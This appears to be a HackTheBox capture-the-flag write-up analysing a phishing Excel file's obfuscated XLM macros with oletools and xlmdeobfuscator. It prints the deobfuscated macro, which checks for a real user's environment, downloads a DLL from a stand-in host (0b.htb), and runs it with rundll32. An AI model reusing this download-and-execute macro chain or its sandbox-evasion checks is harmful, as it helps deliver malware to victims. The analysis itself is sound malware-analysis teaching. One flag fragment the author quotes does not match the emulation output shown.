---
title: "HTB-oBfsC4t10n2"
date: 2026-01-20
draft: false
tags:
  - forensics
  - Malware Analysis
  - Linux
  - excel
  - xlm-macros
  - olevba
  - oleid
  - xlmdeobfuscator
platform: 
---

{{< infobox platform="HackTheBox" difficulty="Hard" os="Linux" date="2026-01-20" >}}

Description:
Another Phishing document. Dig in and see if you can find what it executes.

## TL;DR
Malicious Excel 97-2003 document containing obfuscated XLM (Excel 4.0) macros. Analysis involves identifying the file format, extracting embedded macros using oletools, deobfuscating concatenated formula chains, and reconstructing the complete malicious payload to extract the flag.
## Initial Analysis
I identified the file type to understand its structure. The provided file is an Excel 97-2003 document
```bash
$ file oBfsC4t10n2.xls                                          
oBfsC4t10n2.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: 0xdf, Last Saved By: 0xdf, Name of Creating Application: Microsoft Excel, Create Time/Date: Mon Mar 23 15:19:10 2020, Last Saved Time/Date: Sat Apr 25 19:43:56 2020, Security: 0
```


`oleid` shows no VBA macros but confirms the presence of Excel 4.0 (XLM) macros
```bash
$ oleid oBfsC4t10n2.xls 
...[snip]...
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.               
--------------------+--------------------+----------+--------------------------
XLM Macros          |Yes                 |Medium    |This file contains XLM    
                    |                    |          |macros. Use olevba to     
                    |                    |          |analyse them.             
--------------------+--------------------+----------+--------------------------
...[snip]...
```


## Analysis

Using `olevba` to extract and analyze the XLM macros:
```bash
' Sheet,Reference,Formula,Value
' c1zB0vasN,D8,"IF(GET.WORKSPACE(42),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))",""
' c1zB0vasN,D9,GET.WORKSPACE(13),""
' c1zB0vasN,D10,GOTO(C1300),""
' c1zB0vasN,H60,"CONCATENATE(D187,P602,Y1087,L575)",""
' c1zB0vasN,I180,"CONCATENATE(E615,W1026)",""
' c1zB0vasN,D187,"CONCATENATE(K1036,D1095,Q603,B482)",""
' c1zB0vasN,Q222,"IF(GET.WORKSPACE(19),ON.TIME(NOW()+"00:00:02","rstegerg3"),CLOSE(TRUE))",""
' c1zB0vasN,O347,"CONCATENATE(I1324,M11,L54,F80,Y144,X179,P383)",""
' c1zB0vasN,K390,"CONCATENATE(R890,G625,D1023,O870)",""
' c1zB0vasN,U410,"CONCATENATE(B781,I781)",""
' c1zB0vasN,Y420,"CONCATENATE(B1193,F1204,W1216)",""
' c1zB0vasN,D450,"CONCATENATE(T7,V202)",""
' c1zB0vasN,D513,"CONCATENATE(Y841,L955,A1038,R1149,G1239)",""
' c1zB0vasN,N545,"document.HIDE("c1zB0vasNO",TRUE)",""
' c1zB0vasN,N546,GET.WORKSPACE(1),""
' c1zB0vasN,N547,"IF(ISNUMBER(SEARCH("Windows",N546)),ON.TIME(NOW()+"00:00:02","agawf23f"),CLOSE(FALSE))",""
' c1zB0vasN,L554,"CONCATENATE(D999,K1225)",""
' c1zB0vasN,L575,"CONCATENATE(F1242,W428,R608)",""
' c1zB0vasN,Q603,"CONCATENATE(Q1159,P1236,D1332,R27,W353,D434)",""
' c1zB0vasN,E615,"CONCATENATE(D999,L1217,M1256,U1315)",""
' c1zB0vasN,T698,"IF(OR(D9<700),ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","Lsl23Us7a"))",""
' c1zB0vasN,O752,"CONCATENATE(D8,D513)",""
' c1zB0vasN,B781,"CONCATENATE(E1006,T1063,D874,P180)",""
' c1zB0vasN,I781,"CONCATENATE(Y222,K1085,P765,I809,C877)",""
' c1zB0vasN,D874,"CONCATENATE(E1164,U1191,V1285,N11,E94)",""
' c1zB0vasN,R890,"CONCATENATE(J1273,U385,T673,R75,H865)",""
' c1zB0vasN,C953,"CONCATENATE(B358,Q771,K834,K924,D1020,M1175,F94)",""
' c1zB0vasN,D999,"CONCATENATE(X1224,P1281,U1293,G11,Q801)",""
' c1zB0vasN,R999,"",4.00000000000000000000
' c1zB0vasN,Q1000,CONCATENATE(U410),""
' c1zB0vasN,D1023,"IF(ISNUMBER(SEARCH("6.1",N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))",""
' c1zB0vasN,D1024,GOTO(R1186),""
' c1zB0vasN,W1026,"CONCATENATE(B1334,B36,H461,G1019,U1036)",""
' c1zB0vasN,S1032,"CONCATENATE(M15,T86,S187,V106,R58,P1318,C194,M440)",""
' c1zB0vasN,S1035,"",4.00000000000000000000
' c1zB0vasN,C1040,"CONCATENATE(F1213,I1285,O347,X742)",""
' c1zB0vasN,P1047,"CONCATENATE(H730,C801,K802,S1032,C297,B358)",""
' c1zB0vasN,K1085,"CONCATENATE(G335,Q471,W570,F615,O686,V719)",""
' c1zB0vasN,Y1087,"CONCATENATE(T645,M750,N1097,V551,Z960,B994)",""
' c1zB0vasN,R1186,GET.WORKSPACE(1),""
' c1zB0vasN,R1187,"IF(NOT(ISNUMBER(SEARCH("7.0",R1186))),CLOSE(FALSE))",""
' c1zB0vasN,R1188,"CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner",0)",""
' c1zB0vasN,R1189,"CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner\CkkYKlI",0)",""
' c1zB0vasN,J1190,"CONCATENATE(T1000,W1063,O1107,K1131,D517)",""
' c1zB0vasN,R1190,"CALL(F1220,Q1000,"JJCCJJ",0,H60,G1332,0,0)",""
' c1zB0vasN,R1191,"CALL(L554,I180,"JJCCCCJ",0,"Open","rundll32.exe",CONCATENATE(G1332,D8,D513,K390),0,0)",""
' c1zB0vasN,R1192,GOTO(A1338),""
' c1zB0vasN,F1220,"CONCATENATE(K1184,Y420,D450)",""
' c1zB0vasN,K1225,"CONCATENATE(Q880,V1048)",""
' c1zB0vasN,C1300,GOTO(Q222),""
' c1zB0vasN,G1332,"CONCATENATE(P1047,C593,C1040)",""
' c1zB0vasN,D1337,"IF(F100<300,ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","KsshpqC4Mo"))",""
' c1zB0vasN,A1338,"FORMULA.FILL("a",R~0C~0)",""
' c1zB0vasN,A1339,HALT(),""
```
i see
- `CALL()` to Windows APIs
- `CONCATENATE()` functions (likely obfuscating strings)
- `GET.WORKSPACE()` environment checks
- `rundll32.exe` execution
- File download functionality

Key suspicious indicators:
- `URLDownloadToFileA`
- `ShellExecuteA`
- `rundll32.exe`
- Conditional OS/version checks

## Deobfuscation
To evaluate macro behavior, I used `xlmdeobfuscator` emulation
```bash
$ xlmdeobfuscator --file oBfsC4t10n2.xls
...[snip]...

$ olevba oBfsC4t10n2.xls 
...[snip]...
' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:
' CELL:N545      , PartialEvaluation   , =document.HIDE("c1zB0vasNO",TRUE)
' CELL:N546      , FullEvaluation      , GET.WORKSPACE(1)
' CELL:N547      , Branching           , IF(ISNUMBER(SEARCH("Windows",N546)),ON.TIME(NOW()+"00:00:02","agawf23f"),CLOSE(FALSE))
' CELL:N547      , FullEvaluation      , [TRUE] ON.TIME(NOW()+"00:00:02","agawf23f")
' CELL:D8        , Branching           , IF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))
' CELL:D8        , FullEvaluation      , [TRUE] " HTB{n0w_e"
' CELL:D9        , FullEvaluation      , GET.WORKSPACE(13)
' CELL:D10       , FullEvaluation      , GOTO(C1300)
' CELL:C1300     , FullEvaluation      , GOTO(Q222)
' CELL:Q222      , Branching           , IF(GET.WORKSPACE(19.0),ON.TIME(NOW()+"00:00:02","rstegerg3"),CLOSE(TRUE))
' CELL:Q222      , FullEvaluation      , [TRUE] ON.TIME(NOW()+"00:00:02","rstegerg3")
' CELL:T698      , Branching           , IF(OR(D9<700.0),ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","Lsl23Us7a"))
' CELL:T698      , FullEvaluation      , [FALSE] ON.TIME(NOW()+"00:00:02","Lsl23Us7a")
' CELL:D1337     , Branching           , IF(F100<300.0,ON.TIME(NOW()+"00:00:02",A1),ON.TIME(NOW()+"00:00:02","KsshpqC4Mo"))
' CELL:D1337     , FullEvaluation      , [FALSE] ON.TIME(NOW()+"00:00:02","KsshpqC4Mo")
' CELL:D1023     , Branching           , IF(ISNUMBER(SEARCH("6.1",N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))
' CELL:D1023     , FullEvaluation      , [FALSE] "A$0!(rR"
' CELL:D1024     , FullEvaluation      , GOTO(R1186)
' CELL:R1186     , FullEvaluation      , GET.WORKSPACE(1)
' CELL:R1187     , FullEvaluation      , IF(NOT(ISNUMBER(SEARCH("7.0",R1186))),CLOSE(FALSE))
' CELL:R1188     , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner",0)
' CELL:R1189     , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner\CkkYKlI",0)
' CELL:R1190     , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://0b.htb/s.dll","C:\rncwner\CkuiQhTXx.dll",0,0)
' CELL:R1191     , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","rundll32.exe","C:\rncwner\CkuiQhTXx.dllIF(GET.WORKSPACE(42.0),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))Xc3l_4.0_M4IF(ISNUMBER(SEARCH(""6.1"",N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))}",0,0)
' CELL:R1192     , FullEvaluation      , GOTO(A1338)
' CELL:A1338     , FullEvaluation      , FORMULA.FILL("a",A1:Z1337)
' CELL:A1339     , End                 , HALT()
' CELL:D1023     , FullEvaluation      , [FALSE] "aaaaaaa"
' CELL:D8        , FullEvaluation      , [TRUE] "aaaaaaaaaa"
```

The deobfuscated stream reveals the following behavior:

1. Hiding the document: document.HIDE("c1zB0vasNO",TRUE)
2. Anti-Sandbox: The script checks for specific environment characteristics before proceeding.

- `GET.WORKSPACE(1)` checks the OS version 
- `GET.WORKSPACE(13)` checks screen workspace size
- `GET.WORKSPACE(19)` checks if a mouse is present
- `GET.WORKSPACE(42)` checks if audio capabilities are present

3. It attempts to create a directory structure on the C: drive.
```python
CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner",0)
CALL("Kernel32","CreateDirectoryA","JCJ","C:\rncwner\CkkYKlI",0)
```
4. It downloads a DLL from a remote host using URLDownloadToFileA.
```python
CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://0b.htb/s.dll","C:\rncwner\CkuiQhTXx.dll",0,0)
```
5. It executes the downloaded DLL using rundll32.exe.
```python
CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","rundll32.exe","C:\rncwner\CkuiQhTXx.dll...",0,0)
```

## Flag Reconstruction

Analyzing cell R1191 reveals the flag embedded in the rundll32 command line:

**Part 1:** Cell D8 (when GET.WORKSPACE(42) = TRUE)
```
' CELL:D8, FullEvaluation, [TRUE] " HTB{n0w_e"
```

**Part 2:** Hardcoded string
```
"Xc3l_4.0_M4"
```

**Part 3:** Cell D1023 (when Windows version ≠ 6.1)
```
' CELL:D1023, FullEvaluation, [FALSE] "cr0s_r_b4cK}"
```

**Complete flag:**
```
HTB{n0w_eXc3l_4.0_M4cr0s_r_b4cK}
```

## Attack Flow

{{< mermaid >}}
%%{init: {'theme': 'base', 'themeVariables': { 'background': '#ffffff', 'mainBkg': '#ffffff', 'primaryTextColor': '#000000', 'lineColor': '#333333', 'clusterBkg': '#ffffff', 'clusterBorder': '#333333'}}}%%
graph TD
    %% --- Styling Definitions ---
    classDef default fill:#f9f9f9,stroke:#333,stroke-width:1px,color:#000;
    classDef input fill:#e1f5fe,stroke:#0277bd,stroke-width:2px,color:#000;
    classDef check fill:#fff9c4,stroke:#fbc02d,stroke-width:2px,stroke-dasharray: 5 5,color:#000;
    classDef exec fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#000;
    classDef term fill:#e0e0e0,stroke:#333,stroke-width:2px,color:#000;

    %% --- Flow Logic ---
    User([User Opens oBfsC4t10n2.xls]):::input -->|Enable Content| AutoExec[Auto_Open / XLM Macros Start]:::input
    
    subgraph Anti_Sandbox [Anti-Sandbox / Evasion]
        direction TB
        AutoExec --> CheckOS{Check OS<br/>GET.WORKSPACE 1}:::check
        CheckOS -- "Contains 'Windows'" --> CheckAudio{Check Audio<br/>GET.WORKSPACE 42}:::check
        CheckAudio -- "Audio Present" --> CheckMouse{Check Mouse<br/>GET.WORKSPACE 19}:::check
        
        %% Fail Conditions
        CheckOS -.->|Fail| Close[Close Workbook]:::term
        CheckAudio -.->|Fail| Close
        CheckMouse -.->|Fail| Close
    end

    subgraph Payload_Construction [Payload Construction]
        CheckMouse ==>|Pass| Deobfuscate[Deobfuscate Strings<br/>CONCATENATE & FORMULA.FILL]
    end

    subgraph Execution_Chain [Execution Chain]
        Deobfuscate --> CreateDir[Create Directory<br/>C:\rncwner]:::exec
        CreateDir --> Download[Download DLL<br/>URLDownloadToFileA]:::exec
        Download -- "http://0b.htb/s.dll" --> SaveDll[Save Payload<br/>C:\rncwner\CkuiQhTXx.dll]:::exec
        SaveDll --> RunDll[Execute Payload<br/>ShellExecuteA]:::exec
        RunDll -- "rundll32.exe" --> Compromise((System Compromised)):::exec
    end
{{< /mermaid >}}
